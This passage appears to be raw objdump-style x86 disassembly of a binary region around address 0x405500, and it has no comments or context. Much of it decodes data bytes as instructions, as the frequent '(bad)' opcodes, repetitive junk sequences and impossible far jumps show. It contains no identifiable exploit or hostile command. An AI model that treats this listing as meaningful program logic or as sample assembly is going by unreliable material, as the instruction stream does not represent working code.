  40548b:	loop   0x40548d
  40548d:	into   
  40548e:	popa   
  40548f:	loop   0x405491
  405491:	(bad)  
  405492:	pusha  
  405493:	loop   0x405495
  405495:	dec    esi
  405496:	pop    esi
  405497:	loop   0x405499
  405499:	inc    esi
  40549a:	popa   
  40549b:	loop   0x40549d
  40549d:	fisub  WORD PTR [ecx-0x1e]
  4054a0:	add    dh,dl
  4054a2:	pusha  
  4054a3:	loop   0x4054a5
  4054a5:	pop    esi
  4054a6:	add    BYTE PTR [esi-0x1e],bl
  4054a9:	add    BYTE PTR [esi+0x61],dl
  4054ac:	loop   0x4054ae
  4054ae:	mov    esi,0xb600e261
  4054b3:	pusha  
  4054b4:	loop   0x4054b6
  4054b6:	ds pop esi
  4054b8:	loop   0x4054ba
  4054ba:	ss popa 
  4054bc:	loop   0x4054be
  4054be:	add    BYTE PTR [eax+ebx*8],al
  4054c1:	pop    es
  4054c2:	add    ah,dh
  4054c4:	(bad)  
  4054c5:	pop    es
  4054c6:	add    BYTE PTR [ebp+edx*8+0x7],dh
  4054ca:	add    BYTE PTR [eax+ebx*8+0x7],dh
  4054ce:	add    BYTE PTR [edx*8-0x27cbfff9],al
  4054d5:	pop    es
  4054d6:	add    BYTE PTR [edi+edx*8-0x294bfff9],dh
  4054dd:	pop    es
  4054de:	add    BYTE PTR [edi+edx*8-0x2973fff9],cl
  4054e5:	pop    es
  4054e6:	add    ah,bh
  4054e8:	xlat   BYTE PTR ds:[ebx]
  4054e9:	pop    es
  4054ea:	add    BYTE PTR [edi+edx*8],cl
  4054ed:	pop    es
  4054ee:	add    BYTE PTR [edx*8-0x2973fff9],ch
  4054f5:	pop    es
  4054f6:	add    ah,bh
  4054f8:	(bad)  
  4054f9:	pop    es
  4054fa:	add    ah,ch
  4054fc:	xlat   BYTE PTR ds:[ebx]
  4054fd:	pop    es
  4054fe:	add    BYTE PTR [edi+edx*8],ch
  405501:	pop    es
  405502:	add    BYTE PTR [eax+ebx*8],ch
  405505:	pop    es
  405506:	add    BYTE PTR [esi+edx*8+0x6c000007],bl
  40550d:	xlat   BYTE PTR ds:[ebx]
  40550e:	pop    es
  40550f:	add    BYTE PTR [edi+edx*8],cl
  405512:	pop    es
  405513:	add    BYTE PTR [eax+ebx*8],ch
  405516:	pop    es
  405517:	add    BYTE PTR [esi+edx*8-0x28b3fff9],bl
  40551e:	pop    es
  40551f:	add    ah,bh
  405521:	(bad)  
  405522:	pop    es
  405523:	add    BYTE PTR [eax+ebx*8],bl
  405526:	pop    es
  405527:	add    BYTE PTR [esi+edx*8-0x2863fff9],cl
  40552e:	pop    es
  40552f:	add    BYTE PTR [edi+edx*8],bl
  405532:	pop    es
  405533:	add    BYTE PTR [eax+ebx*8],bl
  405536:	pop    es
  405537:	add    BYTE PTR [edx-0x1d],ah
  40553a:	add    DWORD PTR [ecx],ecx
  40553c:	(bad)  
  40553d:	sti    
  40553e:	add    cl,BYTE PTR [ecx]
  405540:	bound  edx,QWORD PTR [ebx+0x6b620902]
  405546:	add    ecx,DWORD PTR [ecx]
  405548:	(bad)  
  40554a:	add    DWORD PTR [ecx],ecx
  40554c:	(bad)  
  40554d:	sti    
  40554e:	add    cl,BYTE PTR [ecx]
  405550:	bound  esi,QWORD PTR [ebx]
  405552:	add    eax,0x40b6209
  405557:	or     DWORD PTR [edx-0x7d],esp
  40555a:	add    eax,0x49b6209
  40555f:	or     DWORD PTR [edx-0x40],esp
  405562:	add    al,BYTE PTR [edi]
  405564:	bound  eax,QWORD PTR [eax]
  405566:	add    eax,0x4e06207
  40556b:	pop    es
  40556c:	bound  esp,QWORD PTR [eax]
  40556e:	add    eax,0xb0620007
  405573:	add    al,BYTE PTR [edi]
  405575:	(bad)  
  405576:	lock add al,0x7
  405579:	bound  edx,QWORD PTR [eax-0x2f9df8fe]
  40557f:	add    al,0x7
  405581:	bound  ebp,QWORD PTR [eax-0x179df8fe]
  405587:	add    al,0x7
  405589:	bound  ebx,QWORD PTR [eax-0x279df8fe]
  40558f:	add    al,0x7
  405591:	(bad)  
  405592:	fadd   DWORD PTR [edi+eax*1]
  405595:	bound  ebx,QWORD PTR [eax-0x379df8fe]
  40559b:	add    al,0x7
  40559d:	bound  ecx,QWORD PTR [eax-0x439df8fe]
  4055a3:	add    al,BYTE PTR [edi]
  4055a5:	bound  esi,QWORD PTR [edx+eax*1+0x7]
  4055a9:	(bad)  
  4055aa:	fadd   QWORD PTR [edi+eax*1]
  4055ad:	bound  edx,QWORD PTR [edx+eax*1-0x4269df9]
  4055b4:	add    esp,DWORD PTR [ebp-0x27]
  4055b7:	mov    bl,0x3
  4055b9:	pop    ebp
  4055ba:	(bad)  
  4055bc:	add    esp,DWORD PTR [ebp-0x27]
  4055bf:	xchg   ebx,eax
  4055c0:	add    ebx,DWORD PTR [ebp-0x27]
  4055c3:	jmp    0x6a04:0x6ad96a03
  4055ca:	fldcw  WORD PTR [edx+0x2ad95a03]
  4055d0:	add    al,0x5a
  4055d2:	(bad)  [edx]
  4055d4:	add    al,0x0
  4055d6:	push   0xffffffd9
  4055d8:	mov    al,BYTE PTR [ebx]
  4055da:	push   0xffffffd9
  4055dc:	dec    edx
  4055dd:	add    al,0x5a
  4055df:	fxch   st(2)
  4055e1:	add    ebx,DWORD PTR [edx-0x27]
  4055e4:	out    0x3,eax
  4055e6:	addr16 (bad) 
  4055e9:	add    ebx,DWORD PTR [edi-0x27]
  4055ec:	fild   WORD PTR [ebx]
  4055ee:	addr16 fxch st(7)
  4055f1:	add    ebx,DWORD PTR [edi-0x27]
  4055f4:	jmp    0x4055f9
  4055f6:	addr16 fpatan 
  4055f9:	add    ebx,DWORD PTR [edi-0x27]
  4055fc:	jecxz  0x405601
  4055fe:	addr16 fldpi 
  405601:	add    ebx,DWORD PTR [edi-0x27]
  405604:	jmp    0xda19bd0c
  405609:	add    ebx,DWORD PTR [edi-0x27]
  40560c:	loope  0x405611
  40560e:	addr16 (bad) 
  405611:	add    ebx,DWORD PTR [edi-0x27]
  405614:	in     eax,dx
  405615:	add    esp,DWORD PTR [edi-0x27]
  405618:	cmc    
  405619:	add    ebx,DWORD PTR [edi-0x27]
  40561c:	in     eax,0x3
  40561e:	addr16 fldln2 
  405621:	add    ebx,DWORD PTR [edi-0x27]
  405624:	call   0xd919bd2c
  405629:	add    ebx,DWORD PTR [edi-0x27]
  40562c:	add    al,ah
  40562e:	popa   
  40562f:	fiadd  WORD PTR [eax]
  405631:	shl    BYTE PTR [ecx-0x22],1
  405634:	add    ah,ch
  405636:	popa   
  405637:	fiadd  WORD PTR [eax]
  405639:	hlt    
  40563a:	add    BYTE PTR [ecx-0x22],ah
  40563d:	add    ah,ah
  40563f:	popa   
  405640:	fiadd  WORD PTR [eax]
  405642:	in     al,dx
  405643:	popa   
  405644:	fiadd  WORD PTR [eax]
  405646:	jmp    0xde61:0xda00de61
  40564d:	add    dl,ah
  40564f:	popa   
  405650:	fiadd  WORD PTR [eax]
  405652:	shl    BYTE PTR [ecx-0x22],cl
  405655:	add    dh,ch
  405657:	popa   
  405658:	fiadd  WORD PTR [eax]
  40565a:	mul    BYTE PTR [ecx-0x22]
  40565d:	add    cl,ch
  40565f:	pusha  
  405660:	fild   DWORD PTR [ecx]
  405662:	in     eax,0x5d
  405664:	fiadd  WORD PTR [ebx]
  405666:	out    dx,eax
  405667:	imul   ebx,edi,0x6
  40566a:	out    0x6a,al
  40566c:	loopne 0x405673
  40566e:	loope  0x4056c9
  405670:	ror    DWORD PTR [eax],1
  405672:	loope  0x4056cd
  405674:	ror    DWORD PTR [eax],1
  405676:	lock push 0x68f007d2
  40567c:	rol    BYTE PTR [edi],cl
  40567e:	jecxz  0x4056df
  405680:	ror    DWORD PTR [edx],cl
  405682:	jecxz  0x4056db
  405684:	ror    DWORD PTR [edx],cl
  405686:	rep outs dx,DWORD PTR ds:[esi]
  405688:	ror    DWORD PTR [edx],cl
  40568a:	repz ror DWORD PTR [bp+si],cl
  40568e:	loop   0x4056ee
  405690:	aam    0x9
  405692:	loop   0x4056ea
  405694:	aam    0x9
  405696:	repnz outs dx,BYTE PTR ds:[esi]
  405698:	aam    0x9
  40569a:	repnz data16 aam 0x9
  40569e:	in     eax,0x0
  4056a0:	pop    ebp
  4056a1:	aad    0xc
  4056a3:	fst    QWORD PTR [ebp-0x2b]
  4056a6:	or     al,0x0
  4056a8:	not    edi
  4056aa:	or     al,0xc
  4056ac:	pop    es
  4056ad:	fmul   DWORD PTR [esp+ecx*1]
  4056b0:	pop    es
  4056b1:	fmul   DWORD PTR [esp+ecx*1]
  4056b4:	pop    es
  4056b5:	fmul   DWORD PTR [esp+ecx*1]
  4056b8:	xlat   BYTE PTR ds:[ebx]
  4056b9:	xlat   BYTE PTR ds:[ebx]
  4056ba:	or     al,0xc
  4056bc:	(bad)  
  4056bd:	xlat   BYTE PTR ds:[ebx]
  4056be:	or     al,0xc
  4056c0:	(bad)  
  4056c1:	(bad)  
  4056c2:	or     ecx,DWORD PTR ds:0xd0bd6a6
  4056c8:	mov    dh,0xd6
  4056ca:	or     ecx,DWORD PTR ds:0xd0bd6c6
  4056d0:	(bad)  
  4056d1:	(bad)  
  4056d2:	or     ecx,DWORD PTR ds:0xd0bd686
  4056d8:	xchg   esi,eax
  4056d9:	(bad)  
  4056da:	or     ecx,DWORD PTR ds:0xd0bd686
  4056e0:	test   ecx,ecx
  4056e2:	push   cs
  4056e3:	push   cs
  4056e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4056e5:	leave  
  4056e6:	push   cs
  4056e7:	push   cs
  4056e8:	jne    0x4056b3
  4056ea:	push   cs
  4056eb:	push   cs
  4056ec:	test   ecx,ecx
  4056ee:	push   cs
  4056ef:	push   cs
  4056f0:	test   ecx,ecx
  4056f2:	push   cs
  4056f3:	push   cs
  4056f4:	test   ecx,ecx
  4056f6:	push   cs
  4056f7:	push   cs
  4056f8:	push   ebp
  4056f9:	leave  
  4056fa:	push   cs
  4056fb:	push   cs
  4056fc:	inc    ebp
  4056fd:	leave  
  4056fe:	push   cs
  4056ff:	push   cs
  405700:	inc    ebp
  405701:	leave  
  405702:	push   cs
  405703:	push   cs
  405704:	add    BYTE PTR ds:0x350e0ec9,ah
  40570a:	leave  
  40570b:	push   cs
  40570c:	push   cs
  40570d:	inc    ebp
  40570e:	leave  
  40570f:	push   cs
  405710:	push   cs
  405711:	inc    ebp
  405712:	leave  
  405713:	push   cs
  405714:	push   cs
  405715:	add    eax,0x150e0ec9
  40571a:	leave  
  40571b:	push   cs
  40571c:	push   cs
  40571d:	add    eax,0x620e0ec9
  405722:	mov    edi,0x87550f11
  405727:	adc    DWORD PTR [edi],ecx
  405729:	ins    DWORD PTR es:[edi],dx
  40572a:	scas   eax,DWORD PTR es:[edi]
  40572b:	adc    DWORD PTR [edi],ecx
  40572d:	gs mov bh,0x11
  405730:	minps  xmm7,XMMWORD PTR [edi-0x78aaf0ef]
  405737:	adc    DWORD PTR [edi],ecx
  405739:	ins    DWORD PTR es:[edi],dx
  40573a:	scas   eax,DWORD PTR es:[edi]
  40573b:	adc    DWORD PTR [edi],ecx
  40573d:	gs mov bh,0x11
  405740:	minps  xmm7,XMMWORD PTR [edi-0x78aaf0ef]
  405747:	adc    DWORD PTR [edi],ecx
  405749:	ins    DWORD PTR es:[edi],dx
  40574a:	scas   eax,DWORD PTR es:[edi]
  40574b:	adc    DWORD PTR [edi],ecx
  40574d:	gs mov bh,0x11
  405750:	minps  xmm7,XMMWORD PTR [edi-0x78aaf0ef]
  405757:	adc    DWORD PTR [edi],ecx
  405759:	ins    DWORD PTR es:[edi],dx
  40575a:	scas   eax,DWORD PTR es:[edi]
  40575b:	(bad)  
  40575c:	pcmpgtw mm6,QWORD PTR [edi-0x4fa2f0f1]
  405763:	add    dl,BYTE PTR [eax]
  405765:	jae    0x405709
  405767:	adc    BYTE PTR [ebx],dl
  405769:	add    BYTE PTR [ecx-0x7c],dl
  40576c:	push   ss
  40576d:	adc    al,0x4e
  40576f:	lea    ebx,[ecx]
  405771:	adc    eax,0x16148657
  405776:	dec    esp
  405777:	mov    ss,WORD PTR [esi+edx*1]
  40577a:	je     0x405723
  40577c:	pop    ss
  40577d:	pop    ss
  40577e:	ins    DWORD PTR es:[edi],dx
  40577f:	scas   eax,DWORD PTR es:[edi]
  405780:	pop    ss
  405781:	pop    ss
  405782:	jne    0x40572c
  405784:	sbb    bl,BYTE PTR [eax]
  405786:	push   0xffffffa8
  405788:	sbb    bl,BYTE PTR [eax]
  40578a:	pop    edx
  40578b:	mov    eax,0xb85a181a
  405790:	sbb    bl,BYTE PTR [eax]
  405792:	dec    edx
  405793:	mov    DWORD PTR ds:0x1d894b19,ebx
  405799:	sbb    DWORD PTR [ebx-0x27],edi
  40579c:	add    BYTE PTR ds:0x1d00c07b,bl
  4057a2:	imul   eax,eax,0xfffffff1
  4057a5:	sbb    DWORD PTR [eax-0x3d],ebp
  4057a8:	icebp  
  4057a9:	sbb    DWORD PTR [eax-0x3d],ebx
  4057ac:	loope  0x4057c7
  4057ae:	pop    eax
  4057af:	ret    
  4057b0:	loope  0x4057cb
  4057b2:	dec    eax
  4057b3:	ret    
  4057b4:	rcr    DWORD PTR [ecx],1
  4057b6:	dec    eax
  4057b7:	ret    
  4057b8:	rcr    DWORD PTR [ecx],1
  4057ba:	js     0x40577f
  4057bc:	add    DWORD PTR [edx],ebx
  4057be:	js     0x405783
  4057c0:	add    DWORD PTR [edx],ebx
  4057c2:	push   0x691af2c3
  4057c7:	ret    0x1af2
  4057ca:	pop    ecx
  4057cb:	ret    0x1ae2
  4057ce:	add    BYTE PTR [ecx-0x3e],bl
  4057d1:	loop   0x4057ed
  4057d3:	dec    ecx
  4057d4:	ret    0x1ad2
  4057d7:	dec    ecx
  4057d8:	ret    0x1ad2
  4057db:	jns    0x40579f
  4057dd:	add    bl,BYTE PTR [ebx]
  4057df:	jns    0x4057a3
  4057e1:	add    bl,BYTE PTR [ebx]
  4057e3:	imul   eax,edx,0xc5661ff3
  4057e9:	jmp    0x40580a
  4057eb:	pop    esi
  4057ec:	(bad)
  4057ef:	push   esi
  4057f0:	(bad)
  4057f3:	dec    esi
  4057f4:	(bad)
  4057f7:	inc    esi
  4057f8:	(bad)
  4057fb:	jle    0x4057c2
  4057fd:	add    esp,DWORD PTR [eax]
  4057ff:	jbe    0x4057c6
  405801:	sti    
  405802:	pop    ds
  405803:	outs   dx,BYTE PTR ds:[esi]
  405804:	(bad)
  405807:	(bad)
  40580b:	pop    esi
  40580c:	(bad)
  40580f:	push   esi
  405810:	(bad)
  405813:	dec    esi
  405814:	lds    eax,FWORD PTR [eax]
  405816:	aad    0x45
  405818:	lds    ebx,FWORD PTR [ecx*8+0x51cc57d]
  40581f:	inc    edx
  405820:	lds    ebx,FWORD PTR [edi*8-0xbe33a93]
  405827:	inc    edx
  405828:	(bad)  
  405829:	sbb    ebp,esp
  40582b:	inc    edx
  40582c:	(bad)  
  40582d:	sbb    esp,esp
  40582f:	inc    edx
  405830:	(bad)  
  405831:	sbb    ebx,esp
  405833:	add    BYTE PTR [edx-0x3a],al
  405836:	sbb    edx,esp
  405838:	inc    edx
  405839:	(bad)  
  40583a:	sbb    ecx,esp
  40583c:	add    dh,0x1b
  40583f:	add    al,0x83
  405841:	(bad)  
  405842:	sbb    edi,esp
  405844:	add    dh,0x1b
  405847:	hlt    
  405848:	add    dh,0x1b
  40584b:	in     al,dx
  40584c:	add    dh,0x1b
  40584f:	in     al,0x82
  405851:	(bad)  
  405852:	sbb    ebx,esp
  405854:	add    dh,0x1b
  405857:	aam    0x82
  405859:	(bad)  
  40585a:	sbb    ecx,esp
  40585c:	inc    edx
  40585d:	(bad)  
  40585e:	sbb    eax,DWORD PTR [esi*2+0x6cfc1bc6]
  405865:	(bad)  
  405866:	sbb    ebp,ecx
  405868:	pusha  
  405869:	xlat   BYTE PTR ds:[ebx]
  40586a:	add    ebp,esp
  40586c:	fild   DWORD PTR fs:0x7d269f1
  405873:	repz pop ebx
  405875:	ror    BYTE PTR [ecx],1
  405877:	in     eax,0x55
  405879:	aad    0xc
  40587b:	fsubr  QWORD PTR [esi+edx*8+0xb]
  40587f:	mul    DWORD PTR [edi-0x2d]
  405882:	push   cs
  405883:	out    dx,al
  405884:	pop    esi
  405885:	aam    0xd
  405887:	stc    
  405888:	jno    0x405853
  40588a:	adc    cl,bh
  40588c:	push   ecx
  40588d:	leave  
  40588e:	adc    BYTE PTR [eax],al
  405890:	sbb    al,bh
  405892:	movups XMMWORD PTR [edx],xmm1
  405895:	(bad)  
  405896:	movups XMMWORD PTR [eax],xmm0
  405899:	or     edx,ecx
  40589b:	adc    dl,BYTE PTR [edx]
  40589d:	cmp    edx,ecx
  40589f:	adc    dl,BYTE PTR [edx]
  4058a1:	sbb    cl,cl
  4058a3:	adc    DWORD PTR [ebx],edx
  4058a5:	or     cl,cl
  4058a7:	adc    DWORD PTR [ebx],edx
  4058a9:	pop    es
  4058aa:	int3   
  4058ab:	adc    al,0x14
  4058ad:	test   ebx,0xcc171414
  4058b3:	adc    al,0x14
  4058b5:	pop    ss
  4058b6:	int3   
  4058b7:	adc    al,0x14
  4058b9:	push   es
  4058ba:	retf   
  4058bb:	adc    edx,DWORD PTR ds:0x1513cab6
  4058c1:	(bad)  
  4058c2:	retf   0x1513
  4058c5:	(bad)  
  4058c6:	retf   0x1513
  4058c9:	(bad)
  4058cc:	push   ss
  4058cd:	mov    ch,0xcd
  4058cf:	push   ss
  4058d0:	push   ss
  4058d1:	xchg   ebp,eax
  4058d2:	int    0x16
  4058d4:	push   ss
  4058d5:	xchg   ebp,eax
  4058d6:	int    0x16
  4058d8:	push   ss
  4058d9:	test   ah,cl
  4058db:	adc    eax,0x15ccb417
  4058e0:	pop    ss
  4058e1:	xchg   esp,eax
  4058e2:	int3   
  4058e3:	adc    eax,0x15cc9417
  4058e8:	pop    ss
  4058e9:	xchg   ebx,eax
  4058ea:	mov    edi,0xbf731818
  4058ef:	sbb    BYTE PTR [eax],bl
  4058f1:	cmp    DWORD PTR [edi-0x407ce7e8],0x18
  4058f8:	sbb    BYTE PTR [ebx+0x1818bf],dl
  4058fe:	xor    edi,DWORD PTR [edi-0x3a9ce7e8]
  405904:	sbb    BYTE PTR [eax],bl
  405906:	arpl   bp,ax
  405908:	sbb    BYTE PTR [eax],bl
  40590a:	bound  ebp,QWORD PTR [ecx-0x56a4e6e5]
  405910:	sbb    ebx,DWORD PTR [ecx]
  405912:	pop    ebx
  405913:	mov    ecx,0xb94b191b
  405918:	sbb    ebx,DWORD PTR [ecx]
  40591a:	dec    ebx
  40591b:	mov    DWORD PTR [ebx],ebx
  40591d:	sbb    DWORD PTR [ebx-0x77],edi
  405920:	sbb    ebx,DWORD PTR [ecx]
  405922:	jnp    0x4058fd
  405924:	sbb    DWORD PTR [ecx],ebx
  405926:	imul   ebx,ecx,0x19
  405929:	sbb    DWORD PTR [ebx-0x5a],ebp
  40592c:	sbb    BYTE PTR [edx],bl
  40592e:	pop    eax
  40592f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405930:	sbb    BYTE PTR [edx],bl
  405932:	pop    eax
  405933:	mov    dh,0x18
  405935:	sbb    cl,BYTE PTR [eax-0x4a]
  405938:	sbb    BYTE PTR [edx],bl
  40593a:	dec    eax
  40593b:	xchg   BYTE PTR [eax],bl
  40593d:	sbb    bh,BYTE PTR [eax-0x7a]
  405940:	sbb    BYTE PTR [edx],bl
  405942:	js     0x40591a
  405944:	sbb    bl,BYTE PTR [edx]
  405946:	push   0x681a1ad6
  40594b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40594c:	sbb    DWORD PTR [ebx],ebx
  40594e:	pop    ecx
  40594f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405950:	sbb    DWORD PTR [ebx],ebx
  405952:	pop    ecx
  405953:	mov    bh,0x19
  405955:	sbb    ecx,DWORD PTR [ecx-0x49]
  405958:	sbb    DWORD PTR [ebx],ebx
  40595a:	dec    ecx
  40595b:	xchg   DWORD PTR [ecx],ebx
  40595d:	sbb    edi,DWORD PTR [ecx-0x79]
  405960:	sbb    DWORD PTR [ebx],ebx
  405962:	add    BYTE PTR [ecx-0x29],bh
  405965:	sbb    eax,0x1dd7691b
  40596a:	sbb    esp,DWORD PTR [esi-0x50]
  40596d:	add    al,BYTE PTR [eax]
  40596f:	bound  esi,QWORD PTR [ecx-0x519dfffe]
  405975:	add    al,BYTE PTR [eax]
  405977:	bound  ebp,QWORD PTR [edi-0x4b9dfffe]
  40597d:	add    al,BYTE PTR [eax]
  40597f:	bound  edi,QWORD PTR [ebp-0x269dfffe]
  405985:	in     eax,dx
  405986:	add    esp,DWORD PTR [edx-0x27]
  405989:	out    0x3,al
  40598b:	(bad)  
  40598c:	(bad)  
  40598e:	add    esp,DWORD PTR [edx-0x27]
  405991:	loope  0x405996
  405993:	(bad)  
  405994:	fpatan 
  405996:	add    esp,DWORD PTR [edx-0x27]
  405999:	in     eax,dx
  40599a:	add    esp,DWORD PTR [edx-0x27]
  40599d:	xlat   BYTE PTR ds:[ebx]
  40599e:	add    esp,DWORD PTR [edx-0x27]
  4059a1:	rol    DWORD PTR [ebx],cl
  4059a3:	(bad)  
  4059a4:	fcos   
  4059a6:	add    esp,DWORD PTR [edx-0x27]
  4059a9:	sti    
  4059aa:	add    esp,DWORD PTR [edx-0x27]
  4059ad:	pop    es
  4059ae:	add    al,0x62
  4059b0:	fcos   
  4059b2:	add    esp,DWORD PTR [edx-0x27]
  4059b5:	test   DWORD PTR [ebx],0x3ffd962
  4059bb:	(bad)  
  4059bc:	fldenv [edi-0x68269dfd]
  4059c2:	add    esp,DWORD PTR [edx-0x27]
  4059c5:	xchg   DWORD PTR [ebx],eax
  4059c7:	add    BYTE PTR [edx-0x27],ah
  4059ca:	xchg   edi,eax
  4059cb:	add    esp,DWORD PTR [edx-0x27]
  4059ce:	addr16 add al,0x62
  4059d1:	fld    DWORD PTR [edi+0x4]
  4059d4:	(bad)  
  4059d5:	fldenv [edi]
  4059d7:	add    al,0x62
  4059d9:	fld    DWORD PTR [edi]
  4059db:	add    al,0x62
  4059dd:	(bad)  
  4059df:	add    esp,DWORD PTR [edx-0x27]
  4059e2:	out    0x3,eax
  4059e4:	(bad)  
  4059e5:	(bad)  
  4059e7:	add    esp,DWORD PTR [edx-0x27]
  4059ea:	call   0xea19bbf2
  4059ef:	add    esp,DWORD PTR [edx-0x27]
  4059f2:	jmp    0x6203:0xebd96203
  4059f9:	fxam   
  4059fb:	add    esp,DWORD PTR [edx-0x27]
  4059fe:	add    cl,ah
  405a00:	popa   
  405a01:	fld    DWORD PTR [eax]
  405a03:	frstor [ecx-0x27]
  405a06:	add    cl,bh
  405a08:	popa   
  405a09:	fld    DWORD PTR [eax]
  405a0b:	add    DWORD PTR [esi-0x27],ebx
  405a0e:	add    cl,cl
  405a10:	popa   
  405a11:	fld    DWORD PTR [eax]
  405a13:	fldenv [ecx-0x27]
  405a16:	add    BYTE PTR [ecx],ch
  405a18:	data16 fld DWORD PTR [eax]
  405a1b:	or     DWORD PTR [esi-0x27],ebx
  405a1e:	add    BYTE PTR [ecx+0x61],ch
  405a21:	fld    DWORD PTR [eax]
  405a23:	test   eax,0xe900d961
  405a28:	data16 fld DWORD PTR [eax]
  405a2b:	imul   eax,DWORD PTR [eax],0xe900d95e
  405a31:	fld    DWORD PTR [bx+si]
  405a34:	jmp    0xe9413395
  405a39:	in     eax,dx
  405a3a:	mov    al,ds:0xd963e9fe
  405a3f:	add    cl,ch
  405a41:	imul   ebx,ecx,0xd95de900
  405a47:	add    cl,ch
  405a49:	jno    0x405a24
  405a4b:	add    cl,ch
  405a4d:	imul   ebx,ecx,0xd981e900
  405a53:	add    cl,ch
  405a55:	jno    0x405a30
  405a57:	add    cl,ch
  405a59:	mov    eax,ds:0xc1e9fea0
  405a5e:	mov    al,ds:0xd561eafe
  405a63:	add    ah,ah
  405a65:	popa   
  405a66:	xlat   BYTE PTR ds:[ebx]
  405a67:	add    dh,ch
  405a69:	popa   
  405a6a:	rol    DWORD PTR [eax],1
  405a6c:	lock popa 
  405a6e:	rol    DWORD PTR [eax],cl
  405a70:	loop   0x405ad3
  405a72:	into   
  405a73:	add    dh,bl
  405a75:	popa   
  405a76:	retf   0x0
  405a79:	mov    ah,bl
  405a7b:	adc    eax,0x1ddc8000
  405a80:	add    BYTE PTR [eax-0x2b],ch
  405a83:	sub    DWORD PTR [eax],eax
  405a85:	pop    eax
  405a86:	fdivr  QWORD PTR [ecx]
  405a88:	add    BYTE PTR [eax-0x2b],bh
  405a8b:	push   ecx
  405a8c:	add    BYTE PTR [eax-0x2b],bl
  405a8f:	jno    0x405a91
  405a91:	add    al,cl
  405a93:	aad    0xa1
  405a95:	add    BYTE PTR [eax],cl
  405a97:	aad    0xe1
  405a99:	add    BYTE PTR [ecx],bh
  405a9b:	fild   DWORD PTR [eax]
  405a9d:	add    BYTE PTR [ebx],bh
  405a9f:	fadd   QWORD PTR [eax]
  405aa1:	add    BYTE PTR [ebx],bh
  405aa3:	fcom   QWORD PTR [eax]
  405aa5:	add    BYTE PTR [ebx],bh
  405aa7:	fcom   QWORD PTR [eax]
  405aa9:	add    BYTE PTR [ebx],cl
  405aab:	fcom   QWORD PTR [eax]
  405aad:	add    BYTE PTR [ebx],cl
  405aaf:	fcom   QWORD PTR [eax]
  405ab1:	add    dl,bh
  405ab3:	fisttp DWORD PTR [edi]
  405ab5:	add    dl,bh
  405ab7:	fisttp DWORD PTR [edi]
  405ab9:	add    BYTE PTR [ecx],cl
  405abb:	fcom   QWORD PTR [edx]
  405abd:	add    BYTE PTR [ecx],cl
  405abf:	fcom   QWORD PTR [edx]
  405ac1:	add    BYTE PTR [eax-0x47ffee25],bh
  405ac7:	fist   DWORD PTR [ecx]
  405ac9:	add    bh,cl
  405acb:	fist   DWORD PTR [eax+eax*1]
  405ace:	iret   
  405acf:	fist   DWORD PTR [eax+eax*1]
  405ad2:	mov    esi,0xae0013db
  405ad7:	fist   DWORD PTR [ebx]
  405ad9:	add    BYTE PTR [ebx-0x1ff3625],cl
  405adf:	fild   DWORD PTR [eax]
  405ae1:	add    BYTE PTR [edx-0x77fffd25],cl
  405ae7:	fild   DWORD PTR [eax+eax*1]
  405aea:	jle    0x405ac7
  405aec:	add    eax,0xbdb9200
  405af1:	add    BYTE PTR [edx-0x5f],ah
  405af4:	add    bl,BYTE PTR [ecx]
  405af6:	add    BYTE PTR [edx-0x2f],ah
  405af9:	add    al,0x31
  405afb:	(bad)
  405b00:	xor    DWORD PTR [edx],eax
  405b02:	shl    DWORD PTR [edx-0x4f],0x3
  405b06:	and    DWORD PTR [ebx-0x4f],0xb1610104
  405b0d:	inc    BYTE PTR [eax]
  405b0f:	pop    esp
  405b10:	mov    cl,0xa
  405b12:	add    DWORD PTR [esi-0x4f],ebp
  405b15:	adc    al,BYTE PTR [ecx]
  405b17:	pop    edx
  405b18:	mov    cl,0x22
  405b1a:	add    DWORD PTR [edx-0x4f],esi
  405b1d:	ret    0xc200
  405b20:	mov    al,0x2
  405b22:	add    BYTE PTR [edx-0x80],ah
  405b25:	add    dl,BYTE PTR [eax]
  405b27:	bound  eax,QWORD PTR [eax-0x5e9deffe]
  405b2d:	add    dl,BYTE PTR [ecx]
  405b2f:	bound  esp,QWORD PTR [edx-0x5c9dedfe]
  405b35:	add    dl,BYTE PTR [ebx]
  405b37:	bound  esp,QWORD PTR [edx+eax*1+0x27d6214]
  405b3e:	adc    eax,0x16028662
  405b43:	bound  edi,QWORD PTR [edi+0x2]
  405b46:	pop    ss
  405b47:	bound  ecx,QWORD PTR [eax-0x269de7fe]
  405b4d:	add    al,0x19
  405b4f:	(bad)  
  405b50:	fiadd  DWORD PTR [edx+ebx*1]
  405b53:	bound  ebp,QWORD PTR [ebx-0x539de4fe]
  405b59:	add    bl,BYTE PTR [eax+eax*1]
  405b5c:	bound  esi,QWORD PTR [ebp+0x70621d02]
  405b62:	add    al,BYTE PTR [eax+0x62]
  405b65:	jns    0x405b4f
  405b67:	jne    0x405b6c
  405b69:	sbb    al,0xeb
  405b6b:	arpl   WORD PTR [edx-0x27],ax
  405b6e:	push   edi
  405b6f:	in     eax,0x13
  405b71:	cmp    BYTE PTR [ebp-0x1f],cl
  405b74:	icebp  
  405b75:	xor    ebx,DWORD PTR [edx+0x24]
  405b78:	repnz aaa 
  405b7a:	pop    ebx
  405b7b:	repz push es
  405b7d:	xor    eax,0xf8f4f008
  405b82:	sub    ah,BYTE PTR [eax+edx*8]
  405b85:	and    al,0x46
  405b87:	lock retf 0x452c
  405b8b:	and    al,0xc4
  405b8d:	and    al,0x16
  405b8f:	jecxz  0x405b62
  405b91:	xor    BYTE PTR [edi],cl
  405b93:	out    0x8f,al
  405b95:	shl    edi,cl
  405b97:	add    esp,DWORD PTR [edx-0x27]
  405b9a:	aaa    
  405b9b:	fisub  WORD PTR [ecx-0x5e21b827]
  405ba1:	(bad)  
  405ba3:	add    esp,DWORD PTR [edx-0x27]
  405ba6:	in     eax,dx
  405ba7:	and    edx,0x56
  405baa:	push   0xe7d8e285
  405baf:	adc    esp,DWORD PTR [ecx+0x57]
  405bb2:	push   0xfc58e07e
  405bb7:	add    BYTE PTR [edi+0x14],bl
  405bba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405bbb:	shl    dh,0x53
  405bbe:	ins    DWORD PTR es:[edi],dx
  405bbf:	add    DWORD PTR [eax],eax
  405bc1:	(bad)  
  405bc2:	fincstp 
  405bc4:	xor    esp,edx
  405bc6:	or     BYTE PTR [eax-0x7c],ch
  405bc9:	(bad)
